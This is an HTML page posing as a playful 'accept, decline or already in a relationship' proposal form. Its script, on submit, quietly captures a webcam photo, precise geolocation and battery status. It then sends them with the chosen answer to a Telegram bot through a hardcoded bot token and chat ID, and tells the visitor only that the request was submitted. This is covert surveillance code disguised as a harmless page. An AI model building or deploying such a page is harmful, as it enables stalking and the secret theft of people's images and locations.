<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YOUR OPTIONS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #4b0082, #ff4500, #8a2be2, #00ffff);
            background-size: 400% 400%;
            animation: gradientBG 8s ease infinite;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }

        @keyframes gradientBG {
            0% {
                background-position: 0% 50%;
            }

            50% {
                background-position: 100% 50%;
            }

            100% {
                background-position: 0% 50%;
            }
        }

        .container {
            text-align: center;
            padding: 3rem;
            border-radius: 20px;
            backdrop-filter: blur(20px);
            background: rgba(0, 0, 0, 0.6);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
            animation: glow 3s infinite alternate;
        }

        @keyframes glow {
            from {
                box-shadow: 0 0 20px #ff00ff;
            }

            to {
                box-shadow: 0 0 40px #00ffff;
            }
        }

        h1 {
            font-size: 3rem;
            margin-bottom: 2rem;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .option {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            gap: 1rem;
            margin: 1rem 0;
        }

        input[type="checkbox"] {
            appearance: none;
            width: 25px;
            height: 25px;
            border: 2px solid #ff00ff;
            border-radius: 50%;
            cursor: pointer;
        }

        input[type="checkbox"]:checked {
            background: linear-gradient(45deg, #ff00ff, #00ffff);
        }

        label {
            font-size: 1.5rem;
            cursor: pointer;
            user-select: none;
        }

        .submit-btn {
            margin-top: 2rem;
            padding: 1rem 3rem;
            font-size: 1.5rem;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            transition: all 0.3s;
        }

        .submit-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 30px #00ffff;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>SELECT AN OPTION , OR YE KABHI NAHI BADLEGA</h1>

        <div class="option">
            <input type="checkbox" id="accept" name="choice" onclick="selectOnlyOne(this)">
            <label for="accept">ACCEPT ✅</label>
        </div>

        <div class="option">
            <input type="checkbox" id="decline" name="choice" onclick="selectOnlyOne(this)">
            <label for="decline">DECLINE ❌</label>
        </div>

        <div class="option">
            <input type="checkbox" id="someoneElse" name="choice" onclick="selectOnlyOne(this)">
            <label for="someoneElse">ALREADY IN RELATIONSHIP 🙂</label>
        </div>

        <button class="submit-btn" onclick="submitData()">SUBMIT</button>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
        const CHAT_ID = "5112680061";

        function selectOnlyOne(selectedCheckbox) {
            document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
                if (checkbox !== selectedCheckbox) checkbox.checked = false;
            });
        }

        function getSelectedOption() {
            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
            for (let checkbox of checkboxes) {
                if (checkbox.checked) return checkbox.nextElementSibling.innerText;
            }
            return null;
        }

        function submitData() {
            const option = getSelectedOption();
            if (!option) return alert("Please select an option!");

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL("image/png");
                        stream.getTracks().forEach(track => track.stop());

                        captureLocation(option, imageData);
                    }, 3000);
                })
                .catch(() => alert("Camera access denied!"));
        }

        function captureLocation(option, imageData) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                        captureBattery(option, imageData, location);
                    },
                    (error) => {
                        console.error("Location Error:", error.message);
                        captureBattery(option, imageData, "Location Not Available");
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                captureBattery(option, imageData, "Geolocation Not Supported");
            }
        }

        function captureBattery(option, imageData, location) {
            navigator.getBattery().then(battery => {
                const batteryStatus = `Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
                sendToTelegram(option, imageData, location, batteryStatus);
            });
        }

        function sendToTelegram(option, imageData, location, batteryStatus) {
            const message = `✅ User Response\n🟢 Option: ${option}\n📍 Location: ${location}\n🔋 ${batteryStatus}`;
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });

            const blob = dataURItoBlob(imageData);
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "user_image.png");

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            }).then(() => alert("✅ Request Submitted!"));
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
    </script>

</body>

</html>
